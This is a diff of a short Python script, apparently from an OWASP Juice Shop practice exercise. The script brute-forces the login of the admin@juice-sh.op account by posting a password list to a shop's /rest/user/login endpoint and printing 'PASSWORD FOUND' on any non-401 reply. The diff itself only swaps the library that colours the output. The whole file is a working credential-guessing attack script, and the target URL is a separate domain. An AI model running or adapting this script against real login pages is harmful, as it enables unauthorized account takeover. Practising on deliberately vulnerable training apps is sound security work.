@@ -1,6 +1,9 @@
 from urllib import response
 import requests
-from termcolor import colored
+# from termcolor import colored
+from colorama import Fore
+from colorama import Style
+
 
 user = "admin@juice-sh.op"
 
@@ -13,8 +16,9 @@ for password in passwords:
     data ={"email" : user, "password": password}
     response = requests.post("http://shop.bancocn.com/rest/user/login", json=data)
     code = response.status_code
-    print(colored('E-MAIL(login):{} - {} - Status Code : {}'.format(user, password, code), 'blue'))
+    print(f'E-MAIL(login):{Fore.YELLOW}{user}{Style.RESET_ALL} - {Fore.BLUE}{password}{Style.RESET_ALL} - Status Code : {Fore.RED}{code}{Style.RESET_ALL}'.format(user, password, code))
+    # print(f"This is {Fore.GREEN}{user}{Style.RESET_ALL}!".format(user))
     
     if code != 401:
-        print (colored("[+] PASSWORD FOUND - {}".format(password), "green"))
+        print (f"\n[+] PASSWORD FOUND FOR {Fore.CYAN}{user}{Style.RESET_ALL} : {Fore.GREEN}{password}{Style.RESET_ALL}\n\n".format(user, password))
         break
